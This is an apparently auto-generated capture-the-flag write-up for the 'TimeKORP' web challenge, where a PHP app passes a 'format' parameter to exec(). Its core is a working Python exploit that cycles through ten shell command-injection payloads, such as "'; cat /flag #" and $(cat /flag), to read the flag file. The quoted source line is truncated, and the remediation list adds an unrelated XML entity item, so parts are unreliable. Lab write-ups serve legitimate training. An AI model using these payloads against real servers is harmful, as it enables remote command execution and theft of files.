# CTF Write-up: TimeKORP

## 1. Challenge Overview
- **Challenge / Scenario Name:** TimeKORP
- **Category:** Web
- **Target URL:** `http://154.57.164.69:40207`
- **Tech Stack:** PHP, nginx
- **Vulnerability Class:** `Command Injection / RCE`
- **Captured Flag:** `HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_a5fa135179d25cc963d10511189441cf}`

## 2. Scenario & Briefing
> SCENARIO NAME  TimeKORP  Web  Are you ready to unravel the mysteries and expose the truth hidden within KROP's digital domain? Join the challenge and prove your prowess in the world of cybersecurity. Remember, time is money, but in this case, the rewards may be far greater than you imagine.  Expand description  Submit flag \& press enter  DOCKER SPAWNED  154.57.164.69:40207  IP ADDRESS \& PORT

## 3. Vulnerability Analysis
The application was fingerprinted as using **PHP, nginx**. During static analysis and live reconnaissance, the following high-priority sinks/routes were identified:

- **[Command Injection / RCE]** at `challenge\models\TimeModel.php:L11`: `unction getTime()     {         $time = exec($this->command);         $res  = isset($time) ? $time : '?'; [CRITICAL: Target parameter is inside single quotes '...'. Exploit MUST break out using single-quote prefix like: '; cat /flag # or ' || cat /flag || ']`

## 4. Exploitation PoC (Autonomous Python Exploit)
```python
import sys
import requests
import re

# Target URL resolution
target_url = sys.argv[1] if len(sys.argv) > 1 else 'http://154.57.164.69:40207'

# Define candidate payloads to test for command injection
payloads = [
    "' || cat /flag || '",
    "'; cat /flag #",
    "'$(cat /flag)",
    '"$(cat /flag)"',
    "'`cat /flag`'",
    '"`cat /flag`"',
    "'$(cat flag.txt)'",
    '"$(cat flag.txt)"',
    "'$(cat /flag.txt)'",
    '"$(cat /flag.txt)"'
]

# Regular expression to match the flag
pattern = re.compile(r'HTB\{[^}\n]+\}')

for payload in payloads:
    try:
        # Send request with payload
        response = requests.get(target_url, params={'format': payload})
        
        # Check if the response contains the flag
        match = pattern.search(response.text)
        if match:
            print(f"Flag found: {match.group()}")
            break
    except Exception as e:
        print(f"Error occurred: {e}")

if not match:
    print("Failed to find the flag with provided payloads.")
```

## 5. Remediation & Hardening
- Validate and parameterize all user-controlled inputs before processing.
- Avoid executing unsanitized commands directly via shell interpreters (`exec`, `system`, `os.popen`).
- For XML parsers, disable external DTDs and entity resolution (`resolve_entities=False` or `libxml_disable_entity_loader(true)`).
